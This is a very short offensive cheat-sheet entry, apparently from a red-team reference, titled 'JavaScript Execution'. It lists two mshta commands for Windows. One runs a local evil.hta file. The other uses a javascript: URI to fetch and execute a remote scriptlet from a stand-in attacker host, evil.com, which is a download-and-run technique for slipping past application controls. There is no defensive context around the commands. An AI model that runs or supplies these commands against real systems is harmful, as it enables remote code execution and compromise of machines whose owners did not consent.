# JavaScript Execution

```powershell
# A .hta file must consist of HTML source code.
mshta C:\evil.hta

mshta javascript:a=(GetObject('script:https://evil.com/evil.sct')).Exec();close();
```